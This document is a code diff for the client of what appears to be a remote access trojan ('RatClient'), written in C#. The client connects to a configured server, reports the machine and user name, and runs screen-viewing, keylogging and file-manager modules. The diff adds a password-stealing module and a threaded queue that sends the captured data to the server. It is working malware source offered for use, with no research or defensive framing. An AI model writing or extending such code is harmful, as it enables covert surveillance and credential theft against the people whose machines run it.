@@ -2,6 +2,8 @@ using System;
 using System.Net.Sockets;
 using System.Text;
 using System.Web.Script.Serialization;
+using System.Collections.Concurrent;
+using System.Threading;
 using RatClient.Config;
 using RatClient.Features;
 
@@ -14,12 +16,17 @@ class Program
     static readonly string Server = Config.IP;
     static readonly int Port = Config.Port;
     static readonly int bufferSize = Config.BufferSize;
+    static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();
+    static AutoResetEvent messageEvent = new AutoResetEvent(false);
+    static Thread sendThread;
+    static readonly object streamLock = new object();
     #endregion
 
     #region Features
-    static ScreenViewer screenViewer = new ScreenViewer(bufferSize, SendJson);
-    static KeyLogger keyLogger = new KeyLogger(SendJson);
-    static FileManager fileManager = new FileManager(SendJson);
+    static ScreenViewer screenViewer = new ScreenViewer(bufferSize, EnqueueJson);
+    static KeyLogger keyLogger = new KeyLogger(EnqueueJson);
+    static FileManager fileManager = new FileManager(EnqueueJson);
+    static PasswordManager passwordManager = new PasswordManager(EnqueueJson);
     #endregion
 
     public delegate void MessageReceivedHandler(dynamic message);
@@ -31,6 +38,9 @@ class Program
         {
             client = new TcpClient(Server, Port);
             stream = client.GetStream();
+
+            sendThread = new Thread(ProcessQueue);
+            sendThread.Start();
 
             SendInfo();
 
@@ -54,7 +64,10 @@ class Program
         {
             if (stream != null) stream.Close();
             if (client != null) client.Close();
+            if (sendThread != null) sendThread.Abort();
         }
+
+        Console.ReadKey();
     }
 
     static void HandleResponse(dynamic responseJson)
@@ -62,24 +75,40 @@ class Program
         switch (responseJson["type"].ToString())
         {
             case "heartbeat":
-                SendJson(new { type = "heartbeat", text = "pong" });
+                EnqueueJson(new { type = "heartbeat", text = "pong" });
                 break;
         }
     }
 
-    static void SendJson(object jsonObject)
+    static void EnqueueJson(object jsonObject)
     {
         string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
-        byte[] data = Encoding.UTF8.GetBytes(jsonString);
-        int bytesSent = 0;
-        int bytesLeft = data.Length;
+        messageQueue.Enqueue(jsonString);
+        messageEvent.Set();
+    }
 
-        while (bytesLeft > 0)
+    static void ProcessQueue()
+    {
+        while (true)
         {
-            int chunkSize = Math.Min(bufferSize, bytesLeft);
-            stream.Write(data, bytesSent, chunkSize);
-            bytesSent += chunkSize;
-            bytesLeft -= chunkSize;
+            messageEvent.WaitOne();
+            while (messageQueue.TryDequeue(out string jsonString))
+            {
+                byte[] data = Encoding.UTF8.GetBytes(jsonString);
+                int bytesSent = 0;
+                int bytesLeft = data.Length;
+
+                lock (streamLock)
+                {
+                    while (bytesLeft > 0)
+                    {
+                        int chunkSize = Math.Min(bufferSize, bytesLeft);
+                        stream.Write(data, bytesSent, chunkSize);
+                        bytesSent += chunkSize;
+                        bytesLeft -= chunkSize;
+                    }
+                }
+            }
         }
     }
 
@@ -93,6 +122,6 @@ class Program
             pc = Environment.MachineName,
             user = Environment.UserName
         };
-        SendJson(jsonOSInfo);
+        EnqueueJson(jsonOSInfo);
     }
 }
